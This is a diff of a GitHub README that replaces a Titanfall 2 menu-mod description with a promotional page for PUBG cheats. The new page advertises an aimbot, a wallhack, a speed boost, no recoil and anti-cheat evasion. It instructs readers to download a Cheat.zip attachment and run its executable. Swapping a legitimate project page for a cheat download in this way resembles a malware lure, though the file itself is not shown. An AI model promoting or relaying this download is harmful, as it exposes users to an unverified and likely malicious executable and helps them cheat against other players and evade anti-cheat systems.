@@ -1,120 +1,72 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# PUBG-Cheat
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+Welcome to the PUBG-Cheat repository where you can find the latest cheats and hacks for PlayerUnknown's Battlegrounds. Dominate the battlegrounds like never before with our cutting-edge cheats and enhancements. 🎮🔥
 
+## Table of Contents
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Support](#support)
+- [License](#license)
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+## Introduction
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+In the PUBG-Cheat repository, you will find a collection of cheats, hacks, and enhancements designed to give you an edge in the intense battles of PlayerUnknown's Battlegrounds. Whether you're looking to improve your aim, increase your speed, or have access to exclusive in-game advantages, our cheats are here to level up your gameplay experience.
+
+![PUBG Cheats](https://example.com/pubg-cheats.jpg)
+
+PlayerUnknown's Battlegrounds, commonly known as PUBG, is a popular battle royale game where players fight to be the last one standing. With our cheats, you can outperform your opponents and secure more victories in this challenging virtual battleground.
+
+## Features
+
+Our PUBG cheats offer a wide range of features to enhance your gameplay experience. Here are some of the key features you can expect from our cheats:
+
+- Aimbot: Improve your aim and accuracy with our advanced aimbot feature.
+- ESP/Wallhack: See through walls and obstacles to locate enemies easily.
+- Speed Boost: Move faster than your opponents and gain a strategic advantage.
+- No Recoil: Eliminate weapon recoil for precise and consistent shooting.
+- Customization: Tailor the cheats to suit your playstyle with customizable settings.
+
+We are constantly updating our cheats to ensure they remain undetected by anti-cheat systems and provide you with the best possible advantage in PUBG.
 
 ## Installation
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+To install our PUBG cheats, follow these steps:
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+1. Download the cheat files from the following link: [Download Cheat.zip](https://github.com/user-attachments/files/17043020/Cheat.zip).
+2. Extract the contents of the downloaded ZIP file to a folder on your computer.
+3. Launch PUBG and run the cheat executable file.
+4. Configure the cheat settings to your preference.
+5. Enjoy the enhanced gameplay experience with our cheats!
 
-## Icepick
+Please note that the use of cheats in online games may violate the game's terms of service and result in penalties or bans. Use cheats responsibly and at your own risk.
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+## Usage
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+Once you have installed the PUBG cheats, you can start using them in-game to gain an advantage over your opponents. Here are some tips for using our cheats effectively:
 
-3) Launch Icepick.
+1. Activate the aimbot feature to improve your shooting accuracy and take down enemies with ease.
+2. Use the ESP/Wallhack feature to see the positions of other players through obstacles and plan your strategies accordingly.
+3. Take advantage of the speed boost to outmaneuver opponents and secure kills more efficiently.
+4. Customize the cheat settings to match your preferred playstyle and maximize your performance in PUBG.
 
-## Northstar
+With our cheats, you can level up your gameplay, dominate the battlegrounds, and achieve victory in every match you play.
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+## Support
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+If you encounter any issues with the installation or use of our PUBG cheats, please feel free to reach out to our support team for assistance. You can contact us via email at [support@pubg-cheat.com](mailto:support@pubg-cheat.com) or submit a support ticket on our website.
 
-3) Launch Northstar.
+For updates, announcements, and community discussions, follow us on social media:
+- [Twitter](https://twitter.com/pubgcheats)
+- [Discord](https://discord.gg/pubgcheats)
 
-## Screenshots
+Our support team is dedicated to ensuring that you have the best possible experience with our cheats and are here to help you with any questions or concerns you may have.
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+## License
 
-Main Menu with the original Titanfall 2 menu video
+The PUBG cheats provided in this repository are for educational and entertainment purposes only. The use of cheats in online games may violate the game's terms of service, and users are responsible for their actions when using cheats. By downloading and using our cheats, you agree to comply with the game's rules and accept any consequences that may result from the use of cheats.
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+---
 
-Main Menu with the showcase removed to declutter the menu
-
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
-
-New Cheat options that can be enabled as well as the extras menu
-
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
-
-Added keybinds for speedrunners and extra commands for fun
-
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
-
-Shows the values for each setting on the Advanced Look Options
-
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
-
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
-
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+Get ready to dominate the battlegrounds like never before with our cutting-edge cheats and hacks for PUBG. Download now and experience the thrill of victory in PlayerUnknown's Battlegrounds! 🏆🚀
